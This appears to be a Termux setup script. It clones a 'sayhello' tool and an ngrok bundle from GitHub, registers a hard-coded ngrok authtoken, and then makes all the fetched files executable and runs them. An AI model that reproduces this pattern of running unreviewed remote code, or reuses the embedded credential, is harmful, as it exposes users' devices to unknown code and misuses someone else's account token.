pkg update && pkg upgrade -y
sleep 1
pkg install python python2 php
sleep 1
pip install wget
sleep 1
cd $HOME
git clone https://github.com/d093w1z/sayhello
sleep 1
cd
sleep 1
git clone https://github.com/Darkmux/NgrokTH
cd NgrokTH
cp ngrok-stable-linux-arm.zip $HOME
cd $HOME
unzip ngrok-stable-linux-arm.zip
rm -rf ngrok-stable-linux-arm.zip
./ngrok authtoken 1pzIKYeGaWvKh0LeIYGvFbYqrJo_5XJxRspjkd9NemhPfu6kw
sleep 1
cp ngrok /data/data/com.termux/files/home/sayhello
sleep 2
cd
sleep 1
cd sayhello
chmod +x *
bash sayhello.sh
